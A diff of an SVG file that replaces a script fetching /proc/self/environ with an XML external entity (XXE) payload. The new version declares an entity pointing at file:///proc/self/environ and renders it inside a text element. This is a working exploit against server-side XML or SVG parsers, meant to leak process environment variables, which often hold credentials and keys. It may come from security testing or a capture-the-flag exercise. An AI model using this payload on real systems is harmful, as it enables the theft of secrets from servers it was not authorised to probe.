@@ -1,24 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
+]>
 <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
   <rect width="1000" height="1000" fill="white"/>
-  <text id="envText" x="10" y="50" font-size="12" fill="black" style="font-family: monospace;">Loading environment...</text>
-  <script type="text/javascript">
-    fetch('/proc/self/environ')
-      .then(response => {
-        if (!response.ok) {
-            // Throw an error to be caught below, including status
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        return response.text();
-       })
-      .then(data => {
-        // Replace null bytes with newlines for display
-        const formattedData = data.replace(/\x00/g, '\n');
-        document.getElementById('envText').textContent = formattedData;
-      })
-      .catch(error => {
-        // Display the full error message and name
-        document.getElementById('envText').textContent = `Error fetching environment:\nName: ${error.name}\nMessage: ${error.message}`;
-        console.error('Fetch Error:', error); // Also log to console if possible
-      });
-  </script>
-</svg> 
+  <text x="10" y="50" font-size="12" fill="black" style="font-family: monospace;">&xxe;</text>
+</svg>
